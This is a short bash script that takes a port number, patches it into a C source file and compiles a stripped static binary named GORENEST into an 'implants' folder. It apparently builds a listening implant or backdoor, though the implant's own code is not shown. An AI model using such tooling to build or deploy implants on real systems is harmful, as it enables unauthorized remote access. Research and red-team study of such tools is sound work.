#! /bin/bash
if [ $# -eq 0 ]
then
        echo "Usage:"
	echo "-p <PORT> -- port to listen on"
        echo "-h        -- help menu"
fi
while getopts "p:h" opt; do
  case $opt in
    p) PORT=${OPTARG};;
    h) echo "Usage:"
    echo "-p <PORT> -- port to listen on"
    echo "-h        -- help menu";;
  esac
done
if [ -z "$PORT" ]
then
        echo "No port was specified"
        exit
fi
mkdir implants
mkdir build
cp main.c build/main.c
cd build
cat main.c | sed -e "s/#define PORT/#define PORT $PORT/g" > implant.c
gcc implant.c -o GORENEST.$PORT -static -lcrypto -ldl
strip -s GORENEST.$PORT
cp GORENEST.$PORT ../implants
rm -rf *
cd ..
rmdir build


